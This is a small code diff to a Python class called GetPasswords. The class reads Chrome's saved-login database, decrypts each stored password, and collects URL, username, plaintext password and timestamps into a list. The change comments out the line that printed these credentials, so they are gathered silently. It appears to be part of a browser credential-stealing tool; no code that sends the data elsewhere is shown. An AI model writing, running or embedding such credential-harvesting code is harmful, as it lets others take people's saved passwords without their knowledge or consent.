@@ -116,7 +116,7 @@ class GetPasswords:
 
         for url, user, encrypted_password, date_created, date_last_used in cursor.fetchall():
             password = decrypt_password(encrypted_password, key)
-            print(f'browser: Chrome - url: {url} - user: {user} - password: {password} - created: {chromium_timestamp_to_datetime(date_created)} - lastUsed: {chromium_timestamp_to_datetime(date_last_used)}')
+            # print(f'browser: Chrome - url: {url} - user: {user} - password: {password} - created: {chromium_timestamp_to_datetime(date_created)} - lastUsed: {chromium_timestamp_to_datetime(date_last_used)}')
             passwords.append({'browser': "Chrome", 'url': url, 'user': user, 'password': password, 'created': chromium_timestamp_to_datetime(date_created), 'lastUsed': chromium_timestamp_to_datetime(date_last_used)})
 
         cursor.close()
